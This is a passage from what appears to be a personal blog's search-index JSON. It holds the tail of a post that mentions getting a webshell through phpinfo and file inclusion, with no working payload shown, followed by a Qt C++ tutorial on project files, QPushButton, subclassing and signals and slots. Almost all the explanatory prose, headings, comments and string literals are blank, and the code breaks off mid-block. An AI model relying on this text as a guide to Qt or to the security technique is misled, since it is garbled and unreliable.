alt=\"image-20200928215953280\"></p>\n<p>disable_functionswebshell</p>\n<ol>\n<li></li>\n<li><img src=\"/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928220004673.png\" alt=\"image-20200928220004673\"></li>\n</ol>\n<p>phpinfogetshellphpinfophpinfopost_FILES[file1]getshell</p>\n","categories":["web"],"tags":["web"]},{"title":"","url":"https://pz1o.top/2020/12/07//","content":"<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><p></p>\n<p>Qt</p>\n<p></p>\n<p></p>\n<p></p>\n<p><a href=\"https://www.bilibili.com/video/BV1g4411H78N?from=search&amp;seid=13020735672539057046\" target=\"_blank\" rel=\"noopener\">https://www.bilibili.com/video/BV1g4411H78N?from=search&amp;seid=13020735672539057046</a></p>\n<p>b</p>\n<p></p>\n<p>5.14 b5.5 </p>\n<h1 id=\"Qt\"><a href=\"#Qt\" class=\"headerlink\" title=\"Qt\"></a>Qt</h1><h2 id=\"0x01-qt\"><a href=\"#0x01-qt\" class=\"headerlink\" title=\"0x01 qt\"></a>0x01 qt</h2><p></p>\n<p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/811f3f2557606ad0c304488b41000c5f.png\" alt=\"image-20201014194802950\"></p>\n<p></p>\n<p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/Qt5%20%E6%A8%A1%E5%9D%97.png\" alt=\"Qt5 \"></p>\n<h3 id=\"1-\"><a href=\"#1-\" class=\"headerlink\" title=\"1.\"></a>1.</h3><p></p>\n<p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207153603804.png\" alt=\"image-20201207153603804\"></p>\n<p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207153634092.png\" alt=\"image-20201207153634092\"></p>\n<p></p>\n<p></p>\n<p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207153758775.png\" alt=\"image-20201207153758775\"></p>\n<h3 id=\"2-pro\"><a href=\"#2-pro\" class=\"headerlink\" title=\"2. .pro\"></a>2. .pro</h3><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">QT       += core gui  <span class=\"comment\">//</span></span><br><span class=\"line\">greaterThan(QT_MAJOR_VERSION, <span class=\"number\">4</span>): QT += widgets <span class=\"comment\">//Qt4 widget</span></span><br><span class=\"line\">TARGET = QtFirst  <span class=\"comment\">//  .exe</span></span><br><span class=\"line\">TEMPLATE = app    <span class=\"comment\">//    </span></span><br><span class=\"line\">SOURCES += main.cpp\\   <span class=\"comment\">//</span></span><br><span class=\"line\">        mywidget.cpp</span><br><span class=\"line\">HEADERS  += mywidget.h   <span class=\"comment\">//</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p><strong><em>\\</em>.pro(project)qmakemakefile**</strong></p>\n</blockquote>\n<h3 id=\"3-main-cpp\"><a href=\"#3-main-cpp\" class=\"headerlink\" title=\"3.main.cpp\"></a>3.main.cpp</h3><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"mainwindow.h\"</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;QApplication&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> *argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//a  Qt </span></span><br><span class=\"line\">    <span class=\"function\">QApplication <span class=\"title\">a</span><span class=\"params\">(argc, argv)</span></span>;</span><br><span class=\"line\">    <span class=\"comment\">// MainWindow</span></span><br><span class=\"line\">    MainWindow w;</span><br><span class=\"line\">    <span class=\"comment\">//show</span></span><br><span class=\"line\">    w.show();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> a.exec();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p></p>\n<ul>\n<li>Qt.h</li>\n<li>Qt</li>\n<li>QApplication</li>\n<li><ol>\n<li></li>\n<li>Qt<strong>**</strong><strong>*</strong><strong></strong></li>\n<li>QtQApplication 012</li>\n</ol>\n</li>\n<li><p>a.exec()</p>\n</li>\n</ul>\n<p>main()QtQtexec()<strong>exec()Qt</strong></p>\n<h3 id=\"4-\"><a href=\"#4-\" class=\"headerlink\" title=\"4.\"></a>4.</h3><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// </span></span><br><span class=\"line\"><span class=\"comment\">// </span></span><br><span class=\"line\"><span class=\"comment\">// </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//ctrl + / </span></span><br><span class=\"line\"><span class=\"comment\">//ctrl + r </span></span><br><span class=\"line\"><span class=\"comment\">//ctrl + b </span></span><br><span class=\"line\"><span class=\"comment\">//f1 </span></span><br><span class=\"line\"><span class=\"comment\">//ctrl + shift +  </span></span><br><span class=\"line\"><span class=\"comment\">//ctrl + i </span></span><br><span class=\"line\"><span class=\"comment\">//f4 .cpp  .h</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"0x02-Qt\"><a href=\"#0x02-Qt\" class=\"headerlink\" title=\"0x02 Qt\"></a>0x02 Qt</h2><h3 id=\"1-QPushButton\"><a href=\"#1-QPushButton\" class=\"headerlink\" title=\"1.QPushButton\"></a>1.QPushButton</h3><p></p>\n<p>widget.cpp</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;QPushButton&gt;</span></span></span><br><span class=\"line\">&#123; </span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">\t  <span class=\"comment\">//</span></span><br><span class=\"line\">    QPushButton * btn = <span class=\"keyword\">new</span> QPushButton;</span><br><span class=\"line\">    <span class=\"comment\">//show</span></span><br><span class=\"line\">    btn-&gt;show(); </span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    btn-&gt;setParent(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    btn-&gt;setText(<span class=\"string\">\"\"</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    QPushButton * btn2 = <span class=\"keyword\">new</span> QPushButton(<span class=\"string\">\"\"</span>,<span class=\"keyword\">this</span>);</span><br><span class=\"line\">    <span class=\"comment\">//btn2</span></span><br><span class=\"line\">    btn2-&gt;<span class=\"built_in\">move</span>(<span class=\"number\">100</span>,<span class=\"number\">100</span>);</span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    btn2-&gt;resize(<span class=\"number\">50</span>,<span class=\"number\">50</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    resize(<span class=\"number\">600</span>,<span class=\"number\">400</span>);</span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"comment\">//setFixedSize(600,400);</span></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    setWindowTitle(<span class=\"string\">\"\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207155120350.png\" alt=\"image-20201207155120350\"></p>\n<h3 id=\"2-\"><a href=\"#2-\" class=\"headerlink\" title=\"2.\"></a>2.</h3><p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207155310260.png\" alt=\"image-20201207155310260\"></p>\n<p>MyPushButton</p>\n<p>QPushButton</p>\n<p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207155345296.png\" alt=\"image-20201207155345296\"></p>\n<p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207111505680.png\" alt=\"image-20201207111505680\"></p>\n<p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207111746909.png\" alt=\"image-20201207111746909\"></p>\n<p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207111806797.png\" alt=\"image-20201207111806797\"></p>\n<p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207111921782.png\" alt=\"image-20201207111921782\"></p>\n<p></p>\n<p><code>mypushbutton.cpp</code></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"mypushbutton.h\"</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;QDebug&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">MyPushButton::MyPushButton(QWidget *parent) : QPushButton(parent)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    qDebug() &lt;&lt; <span class=\"string\">\"\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">MyPushButton::~MyPushButton()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    qDebug() &lt;&lt; <span class=\"string\">\"\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>mypushbutton.h</code></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifndef</span> MYPUSHBUTTON_H</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> MYPUSHBUTTON_H</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;QWidget&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;QPushButton&gt;</span></span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyPushButton</span> :</span> <span class=\"keyword\">public</span> QPushButton</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    Q_OBJECT</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">explicit</span> <span class=\"title\">MyPushButton</span><span class=\"params\">(QWidget *parent = <span class=\"literal\">nullptr</span>)</span></span>;</span><br><span class=\"line\">     ~MyPushButton();</span><br><span class=\"line\">signals:</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span> <span class=\"comment\">// MYPUSHBUTTON_H</span></span></span><br></pre></td></tr></table></figure>\n<p><code>widget.cpp</code></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\">MyPushButton *btn3 = <span class=\"keyword\">new</span> MyPushButton;</span><br><span class=\"line\">btn3-&gt;show();</span><br><span class=\"line\">btn3-&gt;setParent(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">btn3-&gt;setText(<span class=\"string\">\"\"</span>);</span><br><span class=\"line\">btn3-&gt;<span class=\"built_in\">move</span>(<span class=\"number\">200</span>,<span class=\"number\">100</span>);</span><br></pre></td></tr></table></figure>\n<p></p>\n<p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207215449993.png\" alt=\"image-20201207215449993\"></p>\n<h2 id=\"0x03-\"><a href=\"#0x03-\" class=\"headerlink\" title=\"0x03 \"></a>0x03 </h2><h3 id=\"1-\"><a href=\"#1-\" class=\"headerlink\" title=\"1.\"></a>1.</h3><p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/Qt%E4%BF%A1%E5%8F%B7%E5%92%8C%E6%A7%BD%20.png\" alt=\"Qt \"></p>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;</span><br><span class=\"line\">&#x2F;&#x2F;1  \t2 ()\t 3  4 </span><br><span class=\"line\">connect(btn3, &amp;QPushButton::clicked, this, &amp;QWidget::close);</span><br></pre></td></tr></table></figure>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><strong></strong></h4><p></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//.h</span></span><br><span class=\"line\">signals:</span><br><span class=\"line\">    <span class=\"comment\">// signals</span></span><br><span class=\"line\">    <span class=\"comment\">//void  </span></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">rang</span><span class=\"params\">()</span></span>;</span><br></pre></td></tr></table></figure>\n<p></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//.public</span></span><br><span class=\"line\"><span class=\"keyword\">public</span></span><br><span class=\"line\">    <span class=\"comment\">//void  </span></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">recv</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//.cpp</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">MyPushButton::recv</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    qDebug() &lt;&lt; <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong></strong></p>\n<blockquote>\n<p> </p>\n</blockquote>\n<p></p>\n<ol>\n<li>button</li>\n<li>recv</li>\n</ol>\n<p><strong>   </strong></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//button.h</span></span><br><span class=\"line\">signals:</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">rang</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//recv.h</span></span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">recvsignals</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//recv.cpp</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">recv::recvsignals</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    qDebug() &lt;&lt; <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>,<strong>rang</strong></p>\n<p>rang<strong>plzrang</strong></p>\n<p><code>widget.h</code></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//widget.h</span></span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">    Widget(QWidget *parent = <span class=\"literal\">nullptr</span>);</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">plz</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    ~Widget();</span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">    MyPushButton * btn;</span><br><span class=\"line\">    recv * recv1;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//widget.cpp</span></span><br><span class=\"line\">        <span class=\"keyword\">this</span>-&gt;btn = <span class=\"keyword\">new</span> MyPushButton(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">        <span class=\"keyword\">this</span>-&gt;recv1 = <span class=\"keyword\">new</span> recv;</span><br><span class=\"line\">        btn-&gt;show();</span><br><span class=\"line\">        btn-&gt;setParent(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">        btn-&gt;setText(<span class=\"string\">\"\"</span>);</span><br><span class=\"line\">        btn-&gt;<span class=\"built_in\">move</span>(<span class=\"number\">0</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"built_in\">connect</span>(btn, &amp;MyPushButton::rang, recv1, &amp;recv::recvsignals);</span><br><span class=\"line\">        plz();</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">Widget::plz</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    emit btn-&gt;rang();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-\"><a href=\"#2-\" class=\"headerlink\" title=\"2.\"></a>2.</h3><p></p>\n<p><strong>  </strong> </p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//button.h</span></span><br><span class=\"line\">signals:</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">rang</span><span class=\"params\">(QString)</span></span>;</span><br><span class=\"line\"><span class=\"comment\">//recv.h</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">recvsignals</span><span class=\"params\">(QString s)</span></span>;</span><br><span class=\"line\"><span class=\"comment\">//recv.p</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">recv::recvsignals</span><span class=\"params\">(QString second)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    qDebug() &lt;&lt; <span class=\"string\">\"\"</span> &lt;&lt; second &lt;&lt; <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong></strong></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">//   =</span></span><br><span class=\"line\"><span class=\"keyword\">void</span>(recv:: *recvslot)(QString) = &amp;recv::recvsignals;</span><br><span class=\"line\"><span class=\"keyword\">void</span>(MyPushButton:: *ButtonSignal)(QString) = &amp;MyPushButton::rang;</span><br><span class=\"line\"><span class=\"built_in\">connect</span>(btn, ButtonSignal, recv1, recvslot);</span><br><span class=\"line\">plz();</span><br></pre></td></tr></table></figure>\n<p></p>\n<p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207233628350.png\" alt=\"image-20201207233628350\"></p>\n<blockquote>\n<p>Qstring</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;second.toUtf8().data()</span><br></pre></td></tr></table></figure>\n</blockquote>\n<h3 id=\"3-\"><a href=\"#3-\" class=\"headerlink\" title=\"3.\"></a>3.</h3><ul>\n<li></li>\n<li></li>\n<li></li>\n<li><strong></strong></li>\n<li></li>\n</ul>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p></p>\n<p><strong>1</strong></p>\n<p></p>\n<ol>\n<li>plz</li>\n<li><strong></strong>,</li>\n</ol>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//widget.cpp</span></span><br><span class=\"line\">        QPushButton *btn1 = <span class=\"keyword\">new</span> QPushButton(<span class=\"string\">\"\"</span>,<span class=\"keyword\">this</span>);</span><br><span class=\"line\">        btn1-&gt;<span class=\"built_in\">move</span>(<span class=\"number\">0</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"built_in\">connect</span>(btn1,&amp;QPushButton::clicked,<span class=\"keyword\">this</span>,&amp;Widget::plz);</span><br><span class=\"line\"><span class=\"comment\">//widget.cpp</span></span><br><span class=\"line\">\t\t    QPushButton *btn1 = <span class=\"keyword\">new</span> QPushButton(<span class=\"string\">\"\"</span>,<span class=\"keyword\">this</span>);</span><br><span class=\"line\">        btn1-&gt;<span class=\"built_in\">move</span>(<span class=\"number\">0</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"built_in\">connect</span>(btn1,&amp;QPushButton::clicked,btn,ButtonSignal);</span><br></pre></td></tr></table></figure>\n<p></p>\n<p>1</p>\n<p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201208162609069.png\" alt=\"image-20201208162609069\"></p>\n<p>2</p>\n<p><img src=\"/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201208163512899.png\" alt=\"image-20201208163512899\"></p>\n<h3 id=\"4-Lambda\"><a href=\"#4-Lambda\" class=\"headerlink\" title=\"4.Lambda\"></a>4.Lambda</h3><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[=]()&#123;</span><br><span 